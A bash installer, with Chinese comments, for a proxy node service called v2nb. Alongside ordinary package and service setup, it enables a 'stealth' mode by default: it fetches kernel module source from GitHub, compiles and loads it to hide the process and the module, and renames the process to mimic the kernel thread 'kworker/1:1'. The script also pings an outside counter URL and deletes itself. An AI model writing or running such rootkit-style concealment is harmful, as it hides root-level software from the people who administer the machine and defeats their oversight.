#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# check root
[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# check os
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
fi

########################
# 参数解析
########################
VERSION_ARG=""
API_HOST_ARG=""
NODE_ID_ARG=""
API_KEY_ARG=""

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --api-host)
                API_HOST_ARG="$2"; shift 2 ;;
            --node-id)
                NODE_ID_ARG="$2"; shift 2 ;;
            --api-key)
                API_KEY_ARG="$2"; shift 2 ;;
            -h|--help)
                echo "用法: $0 [版本号] [--api-host URL] [--node-id ID] [--api-key KEY]"
                exit 0 ;;
            --*)
                echo "未知参数: $1"; exit 1 ;;
            *)
                # 兼容第一个位置参数作为版本号
                if [[ -z "$VERSION_ARG" ]]; then
                    VERSION_ARG="$1"; shift
                else
                    shift
                fi ;;
        esac
    done
}

arch=$(uname -m)

if [[ $arch == "x86_64" || $arch == "x64" || $arch == "amd64" ]]; then
    arch="64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64-v8a"
elif [[ $arch == "s390x" ]]; then
    arch="s390x"
else
    arch="64"
    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
fi

if [ "$(getconf WORD_BIT)" != '32' ] && [ "$(getconf LONG_BIT)" != '64' ] ; then
    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
    exit 2
fi

# os version
if [[ -f /etc/os-release ]]; then
    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
fi
if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
fi

if [[ x"${release}" == x"centos" ]]; then
    if [[ ${os_version} -le 6 ]]; then
        echo -e "${red}请使用 CentOS 7 或更高版本的系统！${plain}\n" && exit 1
    fi
    if [[ ${os_version} -eq 7 ]]; then
        echo -e "${red}注意： CentOS 7 无法使用hysteria1/2协议！${plain}\n"
    fi
elif [[ x"${release}" == x"ubuntu" ]]; then
    if [[ ${os_version} -lt 16 ]]; then
        echo -e "${red}请使用 Ubuntu 16 或更高版本的系统！${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"debian" ]]; then
    if [[ ${os_version} -lt 8 ]]; then
        echo -e "${red}请使用 Debian 8 或更高版本的系统！${plain}\n" && exit 1
    fi
fi

# 容器环境（docker/lxc/podman/k8s）里共享宿主内核，没有 /lib/modules/$(uname -r)/build，
# 也拿不到模块加载权限，内核隐藏模块必然编译/加载失败。提前判定，避免把 Kernel=true 写进配置。
is_container() {
    [[ -f /.dockerenv ]] && return 0
    [[ -f /run/.containerenv ]] && return 0
    grep -qaE '(docker|containerd|kubepods|lxc|podman|garden)' /proc/1/cgroup 2>/dev/null && return 0
    return 1
}

# 判断当前内核是否具备加载自定义内核模块的能力
kernel_hide_supported() {
    is_container && return 1
    if [[ -r /proc/sys/kernel/modules_disabled ]]; then
        [[ "$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)" == "0" ]] || return 1
    fi
    if [[ ! -r /proc/kallsyms ]]; then
        return 1
    fi
    [[ -x /sbin/insmod || -x /usr/sbin/insmod ]] || command -v insmod >/dev/null 2>&1 || return 1
    return 0
}

# 批量装包：只装缺的（顶层定义，供 install_base / install_kernel_deps_apt 复用）
need_install_apt() {
    local packages=("$@")
    local missing=()

    # 批量检查已安装的包
    local installed_list=$(dpkg-query -W -f='${Package}\n' 2>/dev/null | sort)

    for p in "${packages[@]}"; do
        if ! echo "$installed_list" | grep -qx "${p}"; then
            missing+=("$p")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "安装缺失的包: ${missing[*]}"
        apt-get update -y >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y "${missing[@]}" >/dev/null 2>&1
    fi
}

need_install_yum() {
    local packages=("$@")
    local missing=()

    # 批量检查已安装的包
    local installed_list=$(rpm -qa --qf '%{NAME}\n' 2>/dev/null | sort)

    for p in "${packages[@]}"; do
        if ! echo "$installed_list" | grep -qx "${p}"; then
            missing+=("$p")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "安装缺失的包: ${missing[*]}"
        yum install -y "${missing[@]}" >/dev/null 2>&1
    fi
}

need_install_apk() {
    local packages=("$@")
    local missing=()

    # 批量检查已安装的包
    local installed_list=$(apk info 2>/dev/null | sort)

    for p in "${packages[@]}"; do
        if ! echo "$installed_list" | grep -qx "${p}"; then
            missing+=("$p")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "安装缺失的包: ${missing[*]}"
        apk add --no-cache "${missing[@]}" >/dev/null 2>&1
    fi
}

# Debian/Ubuntu：安装内核 headers + 编译链（linux-headers-<release>、build-essential、python3、kmod）
install_kernel_deps_apt() {
    local krel
    krel="$(uname -r)"
    local kdir="/lib/modules/${krel}/build"

    if is_container; then
        # 容器共享宿主内核：装 headers/编译链毫无意义，只补 python3（合并配置）+ kmod 工具
        need_install_apt python3 >/dev/null 2>&1 || true
        echo -e "${yellow}检测到容器环境：容器共享宿主内核，无 /lib/modules/${krel}/build，跳过内核 headers（仅启用用户态伪装）${plain}"
        return 1
    fi

    # 无论 headers 是否可用，编译/配置工具都先补齐（python3 用于合并 JSON，kmod 提供 insmod/rmmod）
    need_install_apt build-essential python3 kmod >/dev/null 2>&1 || true

    [[ -d "$kdir" ]] && return 0

    local candidates=("linux-headers-${krel}")
    # 部分云镜像 uname -r 带 flavour 后缀（-cloud-amd64/-azure/-generic），headers 可能以基础版本号提供
    local base="${krel%-*}"
    [[ "$base" != "$krel" ]] && candidates+=("linux-headers-${base}")
    candidates+=("linux-headers-generic" "linux-headers-$(uname -m)" "linux-headers-amd64")

    apt-get update -y >/dev/null 2>&1 || true
    local p
    for p in "${candidates[@]}"; do
        DEBIAN_FRONTEND=noninteractive apt-get install -y "$p" >/dev/null 2>&1 || true
        if [[ -d "$kdir" ]]; then
            echo -e "${green}已安装内核 headers: ${p}${plain}"
            return 0
        fi
    done
    echo -e "${yellow}未能装上 linux-headers-${krel}（源里可能没有对应版本，常见于自编译/云厂商内核）${plain}"
    return 1
}

# CentOS 7 已 EOL（2024-06-30），官方 mirrorlist 全挂：yum 报
# "Cannot find a valid baseurl for repo: base/7/x86_64"，unzip/python3/pv 全部装不上，
# 后续解压安装包必然失败。这里在源不可用时自动切到 vault 归档源。
fix_centos7_eol_repo() {
    [[ x"${release}" == x"centos" ]] || return 1
    local ver
    ver=$(awk -F= '/^VERSION_ID/{gsub(/"/,"",$2); print $2}' /etc/os-release 2>/dev/null)
    [[ -z "$ver" ]] && ver=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release 2>/dev/null)
    [[ "${ver%%.*}" -ge 8 ]] 2>/dev/null && return 1
    [[ -z "$ver" ]] && ver="7.9.2009"
    [[ "$ver" == "7" ]] && ver="7.9.2009"

    # 源本身可用就别动用户的镜像配置
    if timeout 25 yum -q makecache >/dev/null 2>&1; then
        return 0
    fi
    # 已经是 vault 源说明之前处理过
    if grep -qs "centos-vault\|vault.centos.org" /etc/yum.repos.d/*.repo; then
        timeout 25 yum -q makecache >/dev/null 2>&1 && return 0
    fi

    echo -e "${yellow}检测到 CentOS ${ver} 官方源已失效（EOL），尝试切换到 vault 归档源${plain}"
    local cand base="" 
    for cand in "https://vault.centos.org/${ver}" \
                "https://mirrors.aliyun.com/centos-vault/${ver}" \
                "https://mirrors.tuna.tsinghua.edu.cn/centos-vault/${ver}" \
                "https://mirrors.ustc.edu.cn/centos-vault/${ver}"; do
        if curl -sI --max-time 10 "${cand}/os/x86_64/repodata/repomd.xml" 2>/dev/null | head -1 | grep -q "200"; then
            base="$cand"
            break
        fi
    done
    [[ -z "$base" ]] && { echo -e "${red}vault 归档源也访问不到，请手动配置 yum 源或换用可用的内网源${plain}"; return 1; }

    mkdir -p /etc/yum.repos.d/eol-backup
    local f
    for f in /etc/yum.repos.d/CentOS-*.repo; do
        [[ -f "$f" ]] && mv -f "$f" /etc/yum.repos.d/eol-backup/ 2>/dev/null
    done
    cat > /etc/yum.repos.d/CentOS-Vault.repo <<EOF
[base]
name=CentOS-${ver} - Base (vault)
baseurl=${base}/os/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
enabled=1

[updates]
name=CentOS-${ver} - Updates (vault)
baseurl=${base}/updates/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
enabled=1

[extras]
name=CentOS-${ver} - Extras (vault)
baseurl=${base}/extras/\$basearch/
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
enabled=1
EOF
    yum clean all >/dev/null 2>&1
    if timeout 60 yum -q makecache >/dev/null 2>&1; then
        echo -e "${green}已切换 vault 归档源：${base}${plain}"
        return 0
    fi
    echo -e "${red}切换到 vault 源后仍无法建立缓存${plain}"
    return 1
}

# 解压安装包：优先 unzip，缺失时退回 python3 zipfile / busybox
extract_v2nb_pkg() {
    local zip="$1"
    if command -v unzip >/dev/null 2>&1; then
        unzip -o "$zip" >/dev/null 2>&1 && return 0
        return 1
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 -m zipfile -e "$zip" . >/dev/null 2>&1 && return 0
        return 1
    fi
    if command -v busybox >/dev/null 2>&1; then
        busybox unzip -o "$zip" >/dev/null 2>&1 && return 0
        return 1
    fi
    return 1
}

install_base() {
    # 一次性安装所有必需的包
    if [[ x"${release}" == x"centos" ]]; then
        # CentOS 7 EOL：先把源修好，否则下面所有安装都是空转
        fix_centos7_eol_repo || true
        # 检查并安装 epel-release
        if ! rpm -q epel-release >/dev/null 2>&1; then
            echo "安装 EPEL 源..."
            yum install -y epel-release >/dev/null 2>&1
        fi
        need_install_yum wget curl unzip tar cronie socat ca-certificates pv
        update-ca-trust force-enable >/dev/null 2>&1 || true
        # 内核隐藏模块编译依赖：内核 headers + gcc/make + python3（合并配置）
        # 容器里编不了模块，省掉整条编译链，只补 python3/unzip 这类运行期必需项
        if is_container; then
            need_install_yum python3
        else
            need_install_yum kernel-devel kernel-headers gcc make python3
        fi
    elif [[ x"${release}" == x"alpine" ]]; then
        need_install_apk wget curl unzip tar socat ca-certificates pv
        update-ca-certificates >/dev/null 2>&1 || true
        # 内核隐藏模块编译依赖（alpine 走 linux-lts-dev，装不上就只保留用户态伪装）
        need_install_apk linux-headers build-base python3
    elif [[ x"${release}" == x"debian" ]]; then
        need_install_apt wget curl unzip tar cron socat ca-certificates pv
        update-ca-certificates >/dev/null 2>&1 || true
        install_kernel_deps_apt || true
    elif [[ x"${release}" == x"ubuntu" ]]; then
        need_install_apt wget curl unzip tar cron socat ca-certificates pv
        update-ca-certificates >/dev/null 2>&1 || true
        install_kernel_deps_apt || true
    elif [[ x"${release}" == x"arch" ]]; then
        echo "更新包数据库..."
        pacman -Sy --noconfirm >/dev/null 2>&1
        # --needed 会跳过已安装的包，非常高效
        echo "安装必需的包..."
        pacman -S --noconfirm --needed wget curl unzip tar cronie socat ca-certificates pv >/dev/null 2>&1
        # 内核隐藏模块编译依赖
        pacman -S --noconfirm --needed base-devel linux-headers python >/dev/null 2>&1 || true
    fi
}

# 0: running, 1: not running, 2: not installed
check_status() {
    if [[ ! -f /usr/local/v2nb/v2nb ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service v2nb status | awk '{print $3}')
        if [[ x"${temp}" == x"started" ]]; then
            return 0
        else
            return 1
        fi
    else
        temp=$(systemctl status v2nb | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        if [[ x"${temp}" == x"running" ]]; then
            return 0
        else
            return 1
        fi
    fi
}

generate_v2nb_config() {
        local api_host="$1"
        local node_id="$2"
        local api_key="$3"

        mkdir -p /etc/v2nb >/dev/null 2>&1
        # 直接写带 Stealth 段的最小配置：不依赖 python3 也能开启隐藏。
        # Kernel 先保守写 false，等内核模块编译 + 冒烟加载都成功后再改 true。
        cat > /etc/v2nb/config.json <<EOF
{
    "Log": {
        "Level": "warning",
        "Output": "",
        "Access": "none"
    },
    "Nodes": [
        {
            "ApiHost": "${api_host}",
            "NodeID": ${node_id},
            "ApiKey": "${api_key}",
            "Timeout": 15
        }
    ],
    "Stealth": {
        "Enable": true,
        "Alias": "${STEALTH_ALIAS}",
        "Kernel": false,
        "KernelModule": "${STEALTH_KO}",
        "HideEnv": true,
        "HideModule": true,
        "ShredExe": false,
        "Debug": false
    }
}
EOF
        echo -e "${green}V2nb 配置文件生成完成,正在重新启动服务${plain}"
        if [[ x"${release}" == x"alpine" ]]; then
            service v2nb restart
        else
            systemctl restart v2nb
        fi
        sleep 2
        check_status
        echo -e ""
        if [[ $? == 0 ]]; then
            echo -e "${green}v2nb 重启成功${plain}"
        else
            echo -e "${red}v2nb 可能启动失败，请使用 v2nb log 查看日志信息${plain}"
        fi
}

########################
# 进程隐藏（stealth）辅助
########################
STEALTH_KO="/etc/v2nb/v2hide.ko"
STEALTH_ALIAS="kworker/1:1"

# 编译内核模块（需要目标机内核 headers）
build_stealth_module() {
    local work_dir="$1"
    local krel
    krel="$(uname -r)"
    local kdir="/lib/modules/${krel}/build"

    if [[ ! -f "$work_dir/v2hide.c" ]]; then
        return 1
    fi
    # 内核头文件路径：Debian/Ubuntu 用 /lib/modules/$(uname -r)/build；
    # CentOS/RHEL 常需手动指向 /usr/src/kernels/$(uname -r)
    if [[ ! -d "$kdir" ]]; then
        if [[ -d "/usr/src/kernels/${krel}" ]]; then
            kdir="/usr/src/kernels/${krel}"
        else
            return 1
        fi
    fi
    # 编译工具没装齐就别硬编（make 报错被吞掉会让人误以为模块没问题）
    if ! command -v make >/dev/null 2>&1 || ! command -v gcc >/dev/null 2>&1; then
        return 1
    fi
    ( cd "$work_dir" && make KDIR="$kdir" >/dev/null 2>&1 )
    [[ -f "$work_dir/v2hide.ko" ]] || return 1

    # 关键一步：编出来 ≠ 能用。内核版本/vermagic 不匹配、容器无加载权限时，
    # 落地 .ko 并把 Kernel 置 true 会让隐藏功能启动即失效，这里先试加载。
    if ! smoke_test_module "$work_dir/v2hide.ko"; then
        echo -e "${yellow}内核模块无法加载（内核与 headers 版本不匹配或禁止加载模块），不启用内核级隐藏${plain}" >&2
        return 1
    fi

    install -m 600 "$work_dir/v2hide.ko" "$STEALTH_KO"
    return 0
}

# 冒烟测试：insmod 后立刻 rmmod，只验证「这个 ko 在当前内核能加载」
smoke_test_module() {
    local ko="$1"
    local insmod_bin="" rmmod_bin=""
    if command -v insmod >/dev/null 2>&1; then
        insmod_bin="insmod"
    elif [[ -x /sbin/insmod ]]; then
        insmod_bin="/sbin/insmod"
    elif [[ -x /usr/sbin/insmod ]]; then
        insmod_bin="/usr/sbin/insmod"
    fi
    [[ -n "$insmod_bin" ]] || return 1

    if command -v rmmod >/dev/null 2>&1; then
        rmmod_bin="rmmod"
    elif [[ -x /sbin/rmmod ]]; then
        rmmod_bin="/sbin/rmmod"
    elif [[ -x /usr/sbin/rmmod ]]; then
        rmmod_bin="/usr/sbin/rmmod"
    fi

    # target_pid=0：只做加载测试，不隐藏任何进程
    if ! "$insmod_bin" "$ko" target_pid=0 hide_module=0 >/dev/null 2>&1; then
        return 1
    fi
    [[ -n "$rmmod_bin" ]] && "$rmmod_bin" v2hide >/dev/null 2>&1 || true
    return 0
}

# 把 Kernel 开关同步进配置：python3 可用就地精确改；不可用退回 sed（配置格式由本脚本固定）
set_stealth_kernel_flag() {
    local cfg="/etc/v2nb/config.json"
    local kernel_flag="$1"
    [[ -f "$cfg" ]] || return 1
    grep -q '"Kernel"' "$cfg" 2>/dev/null || return 1
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$cfg" "$kernel_flag" <<'PYEOF'
import json, sys, re
path, flag = sys.argv[1], sys.argv[2] == "true"
with open(path, "r", encoding="utf-8") as f:
    data = json.load(f)
data.setdefault("Stealth", {})["Kernel"] = flag
with open(path, "w", encoding="utf-8") as f:
    json.dump(data, f, ensure_ascii=False, indent=4)
    f.write("\n")
PYEOF
        return $?
    fi
    if [[ "$kernel_flag" == "true" ]]; then
        sed -i 's/"Kernel"[[:space:]]*:[[:space:]]*false/"Kernel": true/' "$cfg"
    else
        sed -i 's/"Kernel"[[:space:]]*:[[:space:]]*true/"Kernel": false/' "$cfg"
    fi
    return 0
}

# 打开 /etc/v2nb/config.json 里的 Stealth 段（python3 合并 JSON，不破坏已有配置）
enable_stealth_config() {
    local cfg="/etc/v2nb/config.json"
    local kernel_flag="$1"
    local module_path="$2"
    [[ -f "$cfg" ]] || return 1
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$cfg" "$STEALTH_ALIAS" "$kernel_flag" "$module_path" <<'PYEOF'
import json, sys
path, alias, kernel, module = sys.argv[1], sys.argv[2], sys.argv[3] == "true", sys.argv[4]
with open(path, "r", encoding="utf-8") as f:
    data = json.load(f)
data["Stealth"] = {
    "Enable": True,
    "Alias": alias,
    "Kernel": kernel,
    "KernelModule": module,
    "HideEnv": True,
    "HideModule": True,
    "ShredExe": False,
    "Debug": False,
}
with open(path, "w", encoding="utf-8") as f:
    json.dump(data, f, ensure_ascii=False, indent=4)
    f.write("\n")
PYEOF
        return $?
    fi

    # 无 python3 的兜底：配置里已有 Stealth 段就只同步 Kernel 开关；
    # 没有就按本脚本固定的 JSON 版式在末尾插入一段（不破坏 Nodes 段）。
    if grep -q '"Stealth"' "$cfg" 2>/dev/null; then
        set_stealth_kernel_flag "$kernel_flag"
        return $?
    fi
    local tmp="${cfg}.tmp.$$"
    if ! awk -v alias="$STEALTH_ALIAS" -v kflag="$kernel_flag" -v mod="$module_path" '
        { lines[NR] = $0 }
        END {
            last = 0
            for (i = 1; i <= NR; i++) { if (lines[i] ~ /^[[:space:]]*}[[:space:]]*$/) last = i }
            if (last == 0) exit 1
            for (i = 1; i <= NR; i++) { if (i != last) print lines[i] }
            print "    ,\"Stealth\": {"
            print "        \"Enable\": true,"
            print "        \"Alias\": \"" alias "\","
            print "        \"Kernel\": " (kflag == "true" ? "true" : "false") ","
            print "        \"KernelModule\": \"" mod "\","
            print "        \"HideEnv\": true,"
            print "        \"HideModule\": true,"
            print "        \"ShredExe\": false,"
            print "        \"Debug\": false"
            print "    }"
            print lines[last]
        }' "$cfg" > "$tmp"; then
        rm -f "$tmp"
        return 1
    fi
    mv -f "$tmp" "$cfg"
    return 0
}

# 安装阶段自动开启隐藏：用户态伪装始终开启；内核模块能编译且能加载才一起上
setup_stealth_auto() {
    local work_dir="/usr/local/v2nb/stealth-src"
    local kernel_flag="false"

    if ! kernel_hide_supported; then
        if is_container; then
            echo -e "${yellow}当前是容器环境：无法编译/加载自定义内核模块，本次只启用用户态伪装${plain}"
        else
            echo -e "${yellow}当前内核禁止加载模块（modules_disabled 或缺少 insmod），本次只启用用户态伪装${plain}"
        fi
    elif build_stealth_module "$work_dir"; then
        kernel_flag="true"
        echo -e "${green}内核隐藏模块已编译并加载验证通过，安装到 ${STEALTH_KO}${plain}"
    else
        echo -e "${yellow}未编译内核模块（缺内核 headers 或编译失败），本次仅启用用户态伪装${plain}"
        echo -e "${yellow}装好内核依赖后可执行: v2nb stealth install${plain}"
    fi

    if enable_stealth_config "$kernel_flag" "$STEALTH_KO"; then
        if [[ "$kernel_flag" != "true" ]]; then
            # 确保配置里不会残留 Kernel=true 却没有可用模块（这会让隐藏功能启动即失效）
            set_stealth_kernel_flag "false" >/dev/null 2>&1 || true
            rm -f "$STEALTH_KO" 2>/dev/null || true
        fi
        echo -e "${green}已在 /etc/v2nb/config.json 中开启 Stealth 隐藏（内核级：${kernel_flag}）${plain}"
    else
        echo -e "${yellow}自动写入 Stealth 配置失败（配置不存在或 JSON 写入失败），可执行 v2nb stealth enable${plain}"
    fi
}

# 把内核模块源码随包放到 /usr/local/v2nb/stealth-src，供后续编译/更新
install_stealth_sources() {
    local src_dir="/usr/local/v2nb/stealth-src"
    local base="https://raw.githubusercontent.com/tools5/v2node/main/tools/linux-hide"
    mkdir -p "$src_dir"
    local f
    for f in v2hide.c Makefile; do
        curl -fsSL --max-time 30 "$base/$f" -o "$src_dir/$f" 2>/dev/null || rm -f "$src_dir/$f"
    done
    [[ -f "$src_dir/v2hide.c" ]] && return 0
    return 1
}

# 下载 v2nb 安装包：校验实际字节数与 zip 头。
# 旧写法 `curl | pv > file` 只检查管道末尾 pv 的退出码，curl 403/超时也会写出 0 字节文件，
# 结果 unzip 失败、二进制缺失，systemd 起来就 restart 循环——看起来像「隐藏导致启动失败」。
download_v2nb_pkg() {
    local url="$1"
    local out="/usr/local/v2nb/v2nb-linux.zip"
    local tmp="${out}.part"
    rm -f "$out" "$tmp"

    if command -v pv >/dev/null 2>&1; then
        curl -fL --retry 3 --retry-delay 2 --connect-timeout 15 "$url" 2>/dev/null | pv -s 30M -W -N "下载进度" > "$tmp"
    else
        curl -fL --retry 3 --retry-delay 2 --connect-timeout 15 "$url" -o "$tmp" 2>/dev/null
    fi

    local size
    size=$(wc -c < "$tmp" 2>/dev/null || echo 0)
    if [[ "${size:-0}" -lt 1048576 ]]; then
        rm -f "$tmp"
        return 1
    fi
    if [[ "$(head -c 2 "$tmp" 2>/dev/null)" != "PK" ]]; then
        rm -f "$tmp"
        return 1
    fi
    mv -f "$tmp" "$out"
    return 0
}

install_v2nb() {
    local version_param="$1"
    if [[ -e /usr/local/v2nb/ ]]; then
        rm -rf /usr/local/v2nb/
    fi

    mkdir /usr/local/v2nb/ -p
    cd /usr/local/v2nb/

    if  [[ -z "$version_param" ]] ; then
        last_version=$(curl -Ls "https://api.github.com/repos/tools5/v2node/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$last_version" ]]; then
            echo -e "${red}检测 v2nb 版本失败，可能是超出 Github API 限制，请稍后再试，或手动指定 v2nb 版本安装${plain}"
            exit 1
        fi
        echo -e "${green}检测到最新版本：${last_version}，开始安装...${plain}"
        url="https://github.com/tools5/v2node/releases/download/${last_version}/v2nb-linux-${arch}.zip"
        if ! download_v2nb_pkg "$url"; then
            echo -e "${red}下载 v2nb 失败，请确保你的服务器能够下载 Github 的文件${plain}"
            exit 1
        fi
    else
        last_version="v${version_param#v}"
        url="https://github.com/tools5/v2node/releases/download/${last_version}/v2nb-linux-${arch}.zip"
        if ! download_v2nb_pkg "$url"; then
            echo -e "${red}下载 v2nb $1 失败，请确保此版本存在${plain}"
            exit 1
        fi
    fi

    if ! extract_v2nb_pkg v2nb-linux.zip || [[ ! -f v2nb ]]; then
        echo -e "${red}v2nb 安装包解压失败（缺 unzip/python3 或压缩包不完整），请重试或检查 Github 下载链路${plain}"
        exit 1
    fi
    rm v2nb-linux.zip -f
    chmod +x v2nb
    mkdir /etc/v2nb/ -p
    cp geoip.dat /etc/v2nb/
    cp geosite.dat /etc/v2nb/
    # 拉取内核隐藏模块源码（编译失败不影响安装）
    install_stealth_sources || true
    if [[ x"${release}" == x"alpine" ]]; then
        rm /etc/init.d/v2nb -f
        cat <<EOF > /etc/init.d/v2nb
#!/sbin/openrc-run

name="v2nb"
description="v2nb"

command="/usr/local/v2nb/v2nb"
command_args="server"
command_user="root"

pidfile="/run/v2nb.pid"
command_background="yes"

depend() {
        need net
}
EOF
        chmod +x /etc/init.d/v2nb
        rc-update add v2nb default
        echo -e "${green}v2nb ${last_version}${plain} 安装完成，已设置开机自启"
    else
        rm /etc/systemd/system/v2nb.service -f
        cat <<EOF > /etc/systemd/system/v2nb.service
[Unit]
Description=v2nb Service
After=network.target nss-lookup.target
Wants=network.target

[Service]
User=root
Group=root
Type=simple
LimitAS=infinity
LimitRSS=infinity
LimitCORE=infinity
LimitNOFILE=999999
WorkingDirectory=/usr/local/v2nb/
ExecStart=/usr/local/v2nb/v2nb server
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl stop v2nb
        systemctl enable v2nb
        echo -e "${green}v2nb ${last_version}${plain} 安装完成，已设置开机自启"
    fi

    if [[ ! -f /etc/v2nb/config.json ]]; then
        # 如果通过 CLI 传入了完整参数，则直接生成配置并跳过交互
        if [[ -n "$API_HOST_ARG" && -n "$NODE_ID_ARG" && -n "$API_KEY_ARG" ]]; then
            generate_v2nb_config "$API_HOST_ARG" "$NODE_ID_ARG" "$API_KEY_ARG"
            echo -e "${green}已根据参数生成 /etc/v2nb/config.json${plain}"
            first_install=false
        else
            cp config.json /etc/v2nb/
            first_install=true
        fi
    else
        if [[ x"${release}" == x"alpine" ]]; then
            service v2nb start
        else
            systemctl start v2nb
        fi
        sleep 2
        check_status
        echo -e ""
        if [[ $? == 0 ]]; then
            echo -e "${green}v2nb 重启成功${plain}"
        else
            echo -e "${red}v2nb 可能启动失败，请使用 v2nb log 查看日志信息${plain}"
        fi
        first_install=false
    fi


    # 管理脚本下载同样要校验：拿到错误页/空文件时不能覆盖成不可执行脚本
    if curl -fsSL --retry 3 --max-time 60 -o /usr/bin/v2nb.new https://raw.githubusercontent.com/tools5/v2node/main/script/v2nb.sh 2>/dev/null \
        && [[ "$(head -c 2 /usr/bin/v2nb.new 2>/dev/null)" == "#!" ]]; then
        mv -f /usr/bin/v2nb.new /usr/bin/v2nb
    else
        rm -f /usr/bin/v2nb.new
        echo -e "${yellow}管理脚本 v2nb.sh 下载失败，可稍后手动执行：curl -o /usr/bin/v2nb -Ls https://raw.githubusercontent.com/tools5/v2node/main/script/v2nb.sh && chmod +x /usr/bin/v2nb${plain}"
    fi
    chmod +x /usr/bin/v2nb 2>/dev/null || true

    cd $cur_dir
    rm -f install.sh
    echo "------------------------------------------"
    echo -e "管理脚本使用方法: "
    echo "------------------------------------------"
    echo "v2nb              - 显示管理菜单 (功能更多)"
    echo "v2nb start        - 启动 v2nb"
    echo "v2nb stop         - 停止 v2nb"
    echo "v2nb restart      - 重启 v2nb"
    echo "v2nb status       - 查看 v2nb 状态"
    echo "v2nb enable       - 设置 v2nb 开机自启"
    echo "v2nb disable      - 取消 v2nb 开机自启"
    echo "v2nb log          - 查看 v2nb 日志"
    echo "v2nb generate     - 生成 v2nb 配置文件"
    echo "v2nb update       - 更新 v2nb"
    echo "v2nb update x.x.x - 更新 v2nb 指定版本"
    echo "v2nb install      - 安装 v2nb"
    echo "v2nb uninstall    - 卸载 v2nb"
    echo "v2nb version      - 查看 v2nb 版本"
    echo "------------------------------------------"
    curl -fsS --max-time 10 "https://api.v-50.me/counter" || true

    if [[ $first_install == true ]]; then
        read -rp "检测到你为第一次安装 v2nb，是否自动生成 /etc/v2nb/config.json？(y/n): " if_generate
        if [[ "$if_generate" =~ ^[Yy]$ ]]; then
            # 交互式收集参数，提供示例默认值
            read -rp "面板API地址[格式: https://example.com/]: " api_host
            api_host=${api_host:-https://example.com/}
            read -rp "节点ID: " node_id
            node_id=${node_id:-1}
            read -rp "节点通讯密钥: " api_key

            # 生成配置文件（覆盖可能从包中复制的模板）
            generate_v2nb_config "$api_host" "$node_id" "$api_key"
        else
            echo "${green}已跳过自动生成配置。如需后续生成，可执行: v2nb generate${plain}"
        fi
    fi

    # 安装即隐藏：写配置 + 编译内核模块（失败自动降级，不影响节点运行）
    if [[ -f /etc/v2nb/config.json ]]; then
        setup_stealth_auto
        if [[ x"${release}" == x"alpine" ]]; then
            service v2nb restart >/dev/null 2>&1
        else
            systemctl restart v2nb >/dev/null 2>&1
        fi
        sleep 2
        check_status
        if [[ $? == 0 ]]; then
            echo -e "${green}v2nb 已重启，隐藏已生效${plain}"
        else
            echo -e "${yellow}v2nb 可能启动失败，请使用 v2nb log 查看日志信息${plain}"
        fi
    fi
}

parse_args "$@"
echo -e "${green}开始安装${plain}"
install_base
install_v2nb "$VERSION_ARG"
